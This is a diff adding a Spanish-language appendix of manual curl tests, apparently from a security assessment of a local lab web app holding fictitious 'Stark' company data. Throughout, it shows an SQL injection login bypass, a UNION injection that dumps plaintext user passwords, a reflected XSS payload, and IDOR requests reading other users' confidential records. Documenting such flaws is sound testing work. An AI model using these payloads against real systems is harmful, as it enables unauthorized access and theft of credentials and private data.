@@ -1,0 +1,44 @@
+
+==================== A2. Pruebas manuales con curl ====================
+
+# SQLi: evasión de autenticación (usuario = ana.ti' --)
+
+$ curl -s -c /tmp/stark_j.txt -o /dev/null -w 'HTTP %{http_code} -> %{redirect_url}\n' --data-urlencode "username=ana.ti' --" --data-urlencode 'password=x' http://127.0.0.1:5050/login
+HTTP 302 -> http://127.0.0.1:5050/dashboard
+
+$ curl -s -b /tmp/stark_j.txt http://127.0.0.1:5050/dashboard | grep -o 'Bienvenido(a), [^<]*'
+Bienvenido(a), Ana Torres
+
+$ curl -s -c /tmp/stark_j.txt -o /dev/null -d 'username=sofia.consulta&password=Consulta*26' http://127.0.0.1:5050/login
+
+# SQLi: UNION en /buscar
+
+$ curl -s -b /tmp/stark_j.txt -G --data-urlencode "q=zzz' UNION SELECT username, password, rol FROM usuarios --" http://127.0.0.1:5050/buscar | grep -o '<tr><td>[^<]*</td><td>[^<]*</td><td>[^<]*</td></tr>'
+<tr><td>ana.ti</td><td>TI#Stark2026</td><td>stark_ti</td></tr>
+<tr><td>luis.oper</td><td>Turno1!2026</td><td>stark_oper</td></tr>
+<tr><td>mgarza.rh</td><td>RH-Garza-26</td><td>stark_consulta</td></tr>
+<tr><td>sofia.consulta</td><td>Consulta*26</td><td>stark_consulta</td></tr>
+
+# XSS reflejado: el payload aparece sin escapar en el HTML
+
+$ curl -s -b /tmp/stark_j.txt -G --data-urlencode "q=<script>alert('XSS-Stark')</script>" http://127.0.0.1:5050/buscar | grep -n 'Resultados para'
+40:  <p>Resultados para: <b><script>alert('XSS-Stark')</script></b></p>
+
+# IDOR/BOLA: luis.oper (id 2) pide recursos ajenos
+
+$ curl -s -c /tmp/stark_j.txt -o /dev/null -d 'username=luis.oper&password=Turno1!2026' http://127.0.0.1:5050/login
+
+$ curl -s -b /tmp/stark_j.txt -w '  [HTTP %{http_code}]\n' http://127.0.0.1:5050/api/ordenes/2
+{"clasificacion":"Interno","contenido":"Lote de 5,000 bujes BP-15, m\u00e1quina CNC-03, entrega JIT viernes.","id":2,"titulo":"OT-1002 Programa CNC turno 1","usuario_id":2}
+  [HTTP 200]
+
+$ curl -s -b /tmp/stark_j.txt -w '  [HTTP %{http_code}]\n' http://127.0.0.1:5050/api/ordenes/4
+{"clasificacion":"Confidencial","contenido":"Total de n\u00f3mina: 3.1 M MXN. RFC y NSS de empleados en expediente RH (datos ficticios).","id":4,"titulo":"OT-1004 N\u00f3mina noviembre","usuario_id":4}
+  [HTTP 200]
+
+$ curl -s -b /tmp/stark_j.txt -w '  [HTTP %{http_code}]\n' http://127.0.0.1:5050/api/ordenes/1
+{"clasificacion":"Confidencial","contenido":"SRV-STARK-01 (192.168.56.1): archivos de ingenier\u00eda, identidad y respaldos.","id":1,"titulo":"OT-1001 Inventario de servidores","usuario_id":1}
+  [HTTP 200]
+
+$ curl -s -b /tmp/stark_j.txt http://127.0.0.1:5050/perfil/4 | grep -o '<td>[^<]*@stark.example</td>'
+<td>maria.garza@stark.example</td>
